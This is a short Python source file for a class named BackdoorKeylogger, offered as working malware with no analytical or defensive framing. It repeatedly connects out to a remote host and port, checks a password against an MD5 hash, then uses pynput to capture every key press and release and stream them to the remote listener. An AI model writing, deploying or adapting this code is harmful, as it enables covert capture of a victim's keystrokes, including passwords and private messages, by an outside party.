import os
import sys
import socket
from pynput import keyboard
import hashlib


if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")
elif sys.platform == "darwin":
    os.system("clear")
else:
    print ("Unknown System Detected")


#host = "127.0.0.1"
#port = 9000
#pwd = "60590945d17e42d370e18508846e1478"

class BackdoorKeylogger:
    def __init__(self, host, port, pwd):
        #global soc
        while True:
            try:
                self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.soc.connect((host, port))
                self.soc.send("login")
                self.data = self.soc.recv(3000)
                self.data = self.data.strip()
                self.data_pwd = hashlib.md5(self.data).hexdigest()
                if self.data_pwd.strip() == pwd.strip():
                    self.socket_listener()
                else:
                    self.soc.send("\033[1;32m Access Denied \033[1;m")
                    #socket_conn()
            except socket.error:
                pass
            except KeyboardInterrupt:
                pass

    def keylogger_press(self, key):
        try:
            press = "Press {0}".format(key.char)
            self.soc.sendall(press)
        except AttributeError:
            press = "Press {0}".format(key)
            self.soc.sendall(press)

    def keyloger_release(self, key):
        try:
            release = "release {0}".format(key.char)
            self.soc.sendall(release)
        except AttributeError:
            release = "release {0}".format(key)
            self.soc.sendall(release)

    def socket_listener(self):
        self.soc.send("\033[1;32m Access Granted \033[1;m")
        platform = "\033[1;32m Platform {0}\033[1;m".format(sys.platform)
        self.soc.send(platform)
        with keyboard.Listener(on_press=self.keylogger_press, on_release=self.keyloger_release) as listener:
            listener.join()

